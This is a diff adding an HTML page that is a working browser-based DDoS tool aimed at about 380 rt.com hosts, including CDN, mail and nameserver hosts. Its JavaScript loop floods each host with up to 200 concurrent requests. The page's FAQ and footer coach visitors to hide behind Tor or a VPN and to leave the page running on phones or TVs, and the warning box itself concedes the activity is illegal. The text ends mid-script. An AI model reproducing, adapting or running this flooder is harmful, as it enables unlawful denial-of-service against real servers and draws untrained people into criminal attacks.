@@ -1,0 +1,769 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 232 flood</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 232</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you're likely already aware, the action of DoSing or participating in DDoS is illegal, and for good reason.
+Click on continue if you have a VPN Enabled, use a proxy, use the Tor browser or have your own secure connection and wish to support Ukraine in taking down Russian propaganda.</p>
+    <hr style=" margin-top: 5px; margin-bottom: 5px;">
+    <p>This works by sending GET requests to each targeted website.<br>
+       It’s like opening each website at once on your PC and<br>
+      re-requesting the data over and over, although the data is not saved or cached, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its best to stay safe.</p></div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 232 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between"><a href="https://pages.github.com/" target="_blank" class="style15">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day232.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> 
+                      open the developer console by pressing F12 and select the Network Tab.<br>
+                      If you're on a mac you can't use F12 for this, instead right click anywhere on the site and click inspect, then click the network tab</p>
+                    <p class="style11" style="margin-bottom: 0px;"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This happens because everything that happens is logged by the browser, but you can stop it pretty easily.<br>
+                      In the Network tab on the developer console (F12), press both the red button and the stop symbol.</p>
+                    <details style="margin-bottom: 16px;">
+                      <summary><span style="color: #ffff99;">Click Here to see Example</span></summary>
+                      <img src="https://i.imgur.com/5Cw6kai.png" draggable="false"> </details>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //Today we will cut the tongue of russian propaganda and carry out an ddos attack on rt.com (TV channel "russia today")
+            'https://rt.com:443',
+            'https://forum.arabic.rt.com:443',
+            'https://special-events.rt.com:443',
+            'https://m103.subscribe.rt.com:443',
+            'https://hr.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://ar.2014.rt.com:443',
+            'https://adm-artel-tst.api.rt.com:443',
+            'https://award.rt.com:443',
+            'https://bg.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://br.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://kr.udyunusov.rbth.dev.rt.com:443',
+            'https://inotv.rt.com:443',
+            'https://backend.francais.rt.com:443',
+            'https://wpc.ru.rt.com:443',
+            'https://victory1945.rt.com:443',
+            'https://freevideo.rt.com:443',
+            'https://meetfriends.rt.com:443',
+            'https://actualidad.rt.com:443',
+            'https://lessons.rt.com:443',
+            'https://id.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://jp.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://rs.udyunusov.rbth.dev.rt.com:443',
+            'https://hls.rt.com:443',
+            'https://subscribe.rt.com:443',
+            'https://2014.rt.com:443',
+            'https://chtd.rt.com:443',
+            'https://admin-contacts.rt.com:443',
+            'https://cdn-ddbm.rt.com:443',
+            'https://ns3.rt.com:443',
+            'https://kr.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://www.doc.rt.com:443',
+            'https://cdn.rt.com:443',
+            'https://cdnes.rt.com:443',
+            'https://russiapedia.rt.com:443',
+            'https://cdnh.rt.com:443',
+            'https://stat-test.rt.com:443',
+            'https://jp.udyunusov.rbth.dev.rt.com:443',
+            'https://ddbm-tst.api.rt.com:443',
+            'https://backend.russian.rt.com:443',
+            'https://files.wpc.rt.com:443',
+            'https://catalog.rt.com:443',
+            'https://ar.wpc.rt.com:443',
+            'https://cdni.rt.com:443',
+            'https://fintw-tst.api.rt.com:443',
+            'https://wpc.monitoring.rt.com:443',
+            'https://fr.udyunusov.rbth.dev.rt.com:443',
+            'https://si.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://fr.wpc.rt.com:443',
+            'https://partners.rt.com:443',
+            'https://www.rt.com:443',
+            'https://esp.rt.com:443',
+            'https://old.actualidad.rt.com:443',
+            'https://mariinsky.rt.com:443',
+            'https://de.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://ddbm.rt.com:443',
+            'https://wpc.fr.rt.com:443',
+            'https://wpc.mp.rt.com:443',
+            'https://wpc.d.rt.com:443',
+            'https://wpc.bk.rt.com:443',
+            'https://fr.rt.com:443',
+            'https://ru.wpc.rt.com:443',
+            'https://gitlab.rt.com:443',
+            'https://rusipedia.rt.com:443',
+            'https://ns4.rt.com:443',
+            'https://wiki-tst2.api.rt.com:443',
+            'https://pearlharbor75.rt.com:443',
+            'https://br.udyunusov.rbth.dev.rt.com:443',
+            'https://hr.udyunusov.rbth.dev.rt.com:443',
+            'https://rs.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://si.udyunusov.rbth.dev.rt.com:443',
+            'https://1917.rt.com:443',
+            'https://www.francais.rt.com:443',
+            'https://social.russian.rt.com:443',
+            'https://chernobyl30.rt.com:443',
+            'https://wpc.dvlp.rt.com:443',
+            'https://es.wpc.rt.com:443',
+            'https://de.wpc.rt.com:443',
+            'https://adm.rt.com:443',
+            'https://test-cdn.rt.com:443',
+            'https://it.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://ru.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://9may.rt.com:443',
+            'https://hotforwords.rt.com:443',
+            'https://wpc.es.rt.com:443',
+            'https://backend-chtd.rt.com:443',
+            'https://school.rt.com:443',
+            'https://francais.rt.com:443',
+            'https://m-tst.api.rt.com:443',
+            'https://mail1.rt.com:443',
+            'https://covid19.api.rt.com:443',
+            'https://ns6.rt.com:443',
+            'https://backend.arabic.rt.com:443',
+            'https://www.charity.rt.com:443',
+            'https://wpc.spprj.rt.com:443',
+            'https://secondopinion.rt.com:443',
+            'https://clubdoc.rt.com:443',
+            'https://www.rusopedia.rt.com:443',
+            'https://rus.rt.com:443',
+            'https://charity.rt.com:443',
+            'https://bg.udyunusov.rbth.dev.rt.com:443',
+            'https://de.udyunusov.rbth.dev.rt.com:443',
+            'https://wpc.de.rt.com:443',
+            'https://creativelab.rt.com:443',
+            'https://giletsjaunes.rt.com:443',
+            'https://dom.rt.com:443',
+            'https://gudin.rt.com:443',
+            'https://cdnv.rt.com:443',
+            'https://army.rt.com:443',
+            'https://wpc.fcm.rt.com:443',
+            'https://warwitness.rt.com:443',
+            'https://ruptly-hls.rt.com:443',
+            'https://mirtesen.rt.com:443',
+            'https://arabic.rt.com:443',
+            'https://cdnru.rt.com:443',
+            'https://cdnfr.rt.com:443',
+            'https://msm.rt.com:443',
+            'https://m102.subscribe.rt.com:443',
+            'https://de.rt.com:443',
+            'https://rtmp.api.rt.com:443',
+            'https://wpc.files.rt.com:443',
+            'https://wpc.en.rt.com:443',
+            'https://api.rt.com:443',
+            'https://artel-tst.api.rt.com:443',
+            'https://en.wpc.rt.com:443',
+            'https://fcm.wpc.rt.com:443',
+            'https://worldcup.rt.com:443',
+            'https://arb.rt.com:443',
+            'https://backend.actualidad.rt.com:443',
+            'https://contacts.rt.com:443',
+            'https://10.rt.com:443',
+            'https://wiki-tst.api.rt.com:443',
+            'https://es.udyunusov.rbth.dev.rt.com:443',
+            'https://id.udyunusov.rbth.dev.rt.com:443',
+            'https://it.udyunusov.rbth.dev.rt.com:443',
+            'https://www.udyunusov.rbth.dev.rt.com:443',
+            'https://wpc.ar.rt.com:443',
+            'https://assange.rt.com:443',
+            'https://es.rt.com:443',
+            'https://test.rt.com:443',
+            'https://korchazhkin.dev.actualidad.rt.com:443',
+            'https://space360.rt.com:443',
+            'https://fakecheck.rt.com:443',
+            'https://backend.udyunusov.rbth.dev.rt.com:443',
+            'https://es.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://doc.wpc.rt.com:443',
+            'https://www.russian.rt.com:443',
+            'https://rusopedia.rt.com:443',
+            'https://m104.subscribe.rt.com:443',
+            'https://ns1.rt.com:443',
+            'https://www.actualidad.rt.com:443',
+            'https://mail2.rt.com:443',
+            'https://ns0.rt.com:443',
+            'https://spprj.wpc.rt.com:443',
+            'https://mk.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://mk.udyunusov.rbth.dev.rt.com:443',
+            'https://livecdn.rt.com:443',
+            'https://deutsch.rt.com:443',
+            'https://olymp.api.rt.com:443',
+            'https://m101.subscribe.rt.com:443',
+            'https://bk2.wpc.rt.com:443',
+            'https://mailad.rt.com:443',
+            'https://regions.rt.com:443',
+            'https://dsg-images.api.rt.com:443',
+            'https://fr.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://udyunusov.rbth.dev.rt.com:443',
+            'https://www.backend.udyunusov.rbth.dev.rt.com:443',
+            'https://cdnen.rt.com:443',
+            'https://cdnde.rt.com:443',
+            'https://smarttv.rt.com:443',
+            'https://img.rt.com:443',
+            'https://www.arabic.rt.com:443',
+            'https://service.award.rt.com:443',
+            'https://newsteam.rt.com:443',
+            'https://socialstat.rt.com:443',
+            'https://ns2.rt.com:443',
+            'https://ussr25.rt.com:443',
+            'https://es.2014.rt.com:443',
+            'https://ru.udyunusov.rbth.dev.rt.com:443',
+            'https://dev.rt.com:443',
+            'https://iraq2013.rt.com:443',
+            'https://olymp-bknd.api.rt.com:443',
+            'https://doc.rt.com:443',
+            'https://www.rtd.rt.com:443',
+            'https://www.deutsch.rt.com:443',
+            'https://staff.api.rt.com:443',
+            'https://social.rt.com:443',
+            'https://learnrussian.rt.com:443',
+            'https://russian.rt.com:443',
+            'https://rtd.rt.com:443',
+            'http://rt.com:80',
+            'http://forum.arabic.rt.com:80',
+            'http://special-events.rt.com:80',
+            'http://m103.subscribe.rt.com:80',
+            'http://hr.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://ar.2014.rt.com:80',
+            'http://adm-artel-tst.api.rt.com:80',
+            'http://award.rt.com:80',
+            'http://bg.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://br.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://kr.udyunusov.rbth.dev.rt.com:80',
+            'http://inotv.rt.com:80',
+            'http://backend.francais.rt.com:80',
+            'http://wpc.ru.rt.com:80',
+            'http://victory1945.rt.com:80',
+            'http://freevideo.rt.com:80',
+            'http://meetfriends.rt.com:80',
+            'http://actualidad.rt.com:80',
+            'http://lessons.rt.com:80',
+            'http://id.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://jp.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://rs.udyunusov.rbth.dev.rt.com:80',
+            'http://hls.rt.com:80',
+            'http://subscribe.rt.com:80',
+            'http://2014.rt.com:80',
+            'http://chtd.rt.com:80',
+            'http://admin-contacts.rt.com:80',
+            'http://cdn-ddbm.rt.com:80',
+            'http://ns3.rt.com:80',
+            'http://kr.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://www.doc.rt.com:80',
+            'http://cdn.rt.com:80',
+            'http://cdnes.rt.com:80',
+            'http://russiapedia.rt.com:80',
+            'http://cdnh.rt.com:80',
+            'http://stat-test.rt.com:80',
+            'http://jp.udyunusov.rbth.dev.rt.com:80',
+            'http://ddbm-tst.api.rt.com:80',
+            'http://backend.russian.rt.com:80',
+            'http://files.wpc.rt.com:80',
+            'http://catalog.rt.com:80',
+            'http://ar.wpc.rt.com:80',
+            'http://cdni.rt.com:80',
+            'http://fintw-tst.api.rt.com:80',
+            'http://wpc.monitoring.rt.com:80',
+            'http://fr.udyunusov.rbth.dev.rt.com:80',
+            'http://si.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://fr.wpc.rt.com:80',
+            'http://partners.rt.com:80',
+            'http://www.rt.com:80',
+            'http://esp.rt.com:80',
+            'http://old.actualidad.rt.com:80',
+            'http://mariinsky.rt.com:80',
+            'http://de.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://ddbm.rt.com:80',
+            'http://wpc.fr.rt.com:80',
+            'http://wpc.mp.rt.com:80',
+            'http://wpc.d.rt.com:80',
+            'http://wpc.bk.rt.com:80',
+            'http://fr.rt.com:80',
+            'http://ru.wpc.rt.com:80',
+            'http://gitlab.rt.com:80',
+            'http://rusipedia.rt.com:80',
+            'http://ns4.rt.com:80',
+            'http://wiki-tst2.api.rt.com:80',
+            'http://pearlharbor75.rt.com:80',
+            'http://br.udyunusov.rbth.dev.rt.com:80',
+            'http://hr.udyunusov.rbth.dev.rt.com:80',
+            'http://rs.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://si.udyunusov.rbth.dev.rt.com:80',
+            'http://1917.rt.com:80',
+            'http://www.francais.rt.com:80',
+            'http://social.russian.rt.com:80',
+            'http://chernobyl30.rt.com:80',
+            'http://wpc.dvlp.rt.com:80',
+            'http://es.wpc.rt.com:80',
+            'http://de.wpc.rt.com:80',
+            'http://adm.rt.com:80',
+            'http://test-cdn.rt.com:80',
+            'http://it.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://ru.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://9may.rt.com:80',
+            'http://hotforwords.rt.com:80',
+            'http://wpc.es.rt.com:80',
+            'http://backend-chtd.rt.com:80',
+            'http://school.rt.com:80',
+            'http://francais.rt.com:80',
+            'http://m-tst.api.rt.com:80',
+            'http://mail1.rt.com:80',
+            'http://covid19.api.rt.com:80',
+            'http://ns6.rt.com:80',
+            'http://backend.arabic.rt.com:80',
+            'http://www.charity.rt.com:80',
+            'http://wpc.spprj.rt.com:80',
+            'http://secondopinion.rt.com:80',
+            'http://clubdoc.rt.com:80',
+            'http://www.rusopedia.rt.com:80',
+            'http://rus.rt.com:80',
+            'http://charity.rt.com:80',
+            'http://bg.udyunusov.rbth.dev.rt.com:80',
+            'http://de.udyunusov.rbth.dev.rt.com:80',
+            'http://wpc.de.rt.com:80',
+            'http://creativelab.rt.com:80',
+            'http://giletsjaunes.rt.com:80',
+            'http://dom.rt.com:80',
+            'http://gudin.rt.com:80',
+            'http://cdnv.rt.com:80',
+            'http://army.rt.com:80',
+            'http://wpc.fcm.rt.com:80',
+            'http://warwitness.rt.com:80',
+            'http://ruptly-hls.rt.com:80',
+            'http://mirtesen.rt.com:80',
+            'http://arabic.rt.com:80',
+            'http://cdnru.rt.com:80',
+            'http://cdnfr.rt.com:80',
+            'http://msm.rt.com:80',
+            'http://m102.subscribe.rt.com:80',
+            'http://de.rt.com:80',
+            'http://rtmp.api.rt.com:80',
+            'http://wpc.files.rt.com:80',
+            'http://wpc.en.rt.com:80',
+            'http://api.rt.com:80',
+            'http://artel-tst.api.rt.com:80',
+            'http://en.wpc.rt.com:80',
+            'http://fcm.wpc.rt.com:80',
+            'http://worldcup.rt.com:80',
+            'http://arb.rt.com:80',
+            'http://backend.actualidad.rt.com:80',
+            'http://contacts.rt.com:80',
+            'http://10.rt.com:80',
+            'http://wiki-tst.api.rt.com:80',
+            'http://es.udyunusov.rbth.dev.rt.com:80',
+            'http://id.udyunusov.rbth.dev.rt.com:80',
+            'http://it.udyunusov.rbth.dev.rt.com:80',
+            'http://www.udyunusov.rbth.dev.rt.com:80',
+            'http://wpc.ar.rt.com:80',
+            'http://assange.rt.com:80',
+            'http://es.rt.com:80',
+            'http://test.rt.com:80',
+            'http://korchazhkin.dev.actualidad.rt.com:80',
+            'http://space360.rt.com:80',
+            'http://fakecheck.rt.com:80',
+            'http://backend.udyunusov.rbth.dev.rt.com:80',
+            'http://es.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://doc.wpc.rt.com:80',
+            'http://www.russian.rt.com:80',
+            'http://rusopedia.rt.com:80',
+            'http://m104.subscribe.rt.com:80',
+            'http://ns1.rt.com:80',
+            'http://www.actualidad.rt.com:80',
+            'http://mail2.rt.com:80',
+            'http://ns0.rt.com:80',
+            'http://spprj.wpc.rt.com:80',
+            'http://mk.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://mk.udyunusov.rbth.dev.rt.com:80',
+            'http://livecdn.rt.com:80',
+            'http://deutsch.rt.com:80',
+            'http://olymp.api.rt.com:80',
+            'http://m101.subscribe.rt.com:80',
+            'http://bk2.wpc.rt.com:80',
+            'http://mailad.rt.com:80',
+            'http://regions.rt.com:80',
+            'http://dsg-images.api.rt.com:80',
+            'http://fr.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://udyunusov.rbth.dev.rt.com:80',
+            'http://www.backend.udyunusov.rbth.dev.rt.com:80',
+            'http://cdnen.rt.com:80',
+            'http://cdnde.rt.com:80',
+            'http://smarttv.rt.com:80',
+            'http://img.rt.com:80',
+            'http://www.arabic.rt.com:80',
+            'http://service.award.rt.com:80',
+            'http://newsteam.rt.com:80',
+            'http://socialstat.rt.com:80',
+            'http://ns2.rt.com:80',
+            'http://ussr25.rt.com:80',
+            'http://es.2014.rt.com:80',
+            'http://ru.udyunusov.rbth.dev.rt.com:80',
+            'http://dev.rt.com:80',
+            'http://iraq2013.rt.com:80',
+            'http://olymp-bknd.api.rt.com:80',
+            'http://doc.rt.com:80',
+            'http://www.rtd.rt.com:80',
+            'http://www.deutsch.rt.com:80',
+            'http://staff.api.rt.com:80',
+            'http://social.rt.com:80',
+            'http://learnrussian.rt.com:80',
+            'http://russian.rt.com:80',
+            'http://rtd.rt.com:80',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h4>${urls[i]}</h4>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
